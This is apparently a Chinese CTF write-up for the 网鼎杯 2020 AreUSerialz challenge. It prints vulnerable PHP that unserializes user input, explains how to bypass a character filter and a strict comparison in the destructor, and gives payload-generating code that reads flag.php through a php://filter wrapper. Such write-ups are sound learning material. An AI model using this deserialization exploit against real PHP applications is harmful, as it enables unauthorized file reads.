---
title: buuoj [网鼎杯 2020 青龙组] （持续更新）
date: 2020-09-23 08:56:45
tags: CTF WEB
categories: CTF做题记录
---

>复现地址：https://buuoj.cn/
>拖了这么久才看网鼎杯。。这就是菜的原因吧
>20-9-22 -> 20-

<!-- TOC -->

- [[网鼎杯 2020 青龙组]AreUSerialz](#网鼎杯-2020-青龙组areuserialz)

<!-- /TOC -->

<!--more-->
---
# [网鼎杯 2020 青龙组]AreUSerialz
>知识点：代码审计，反序列化

打开就是代码审计
```php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}

```
分析源码，==is_valid()== 函数只能让你使用下列字符，然后咋做这个题呢？
类里面的==read()==可以被控制，去读取flag.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200922222158892.png#pic_center)
>不了解反序列化的童鞋可以看看这个：https://xz.aliyun.com/t/3674

反序列化的时候由于类变量是protected，而protected属性在序列化后会变成不可见字符（\00，此字符会截断字符串，导致payload无法使用），导致不能绕过==is_valid()== 
绕过方法：
- 将序列化后的小写==s== 变为大写==S== ，使其后面字符支持16进制
  具体可以这样![在这里插入图片描述](https://img-blog.csdnimg.cn/20200922230706662.png#pic_center)

- PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过

再者，==__destruct()== 里面`$this->op === "2"`是强比较，==process()== 里面是弱比较。所以可以使`op=2`，int型的，就可以绕过析构函数
然后就可以用伪协议读flag
```php
<?php
	class FileHandler {
		public $op = 2;
		public $filename = "php://filter/read=convert.base64-encode/resource=flag.php";
		public $content = "";
	}
	$a = new FileHandler();
	echo(serialize($a));
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200922225503877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
或者直接写flag.php
```php
<?php
	class FileHandler {
		public $op = 2;
		public $filename = "flag.php";
		public $content = "";
	}
	$a = new FileHandler();
	echo(serialize($a));
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200922225621774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

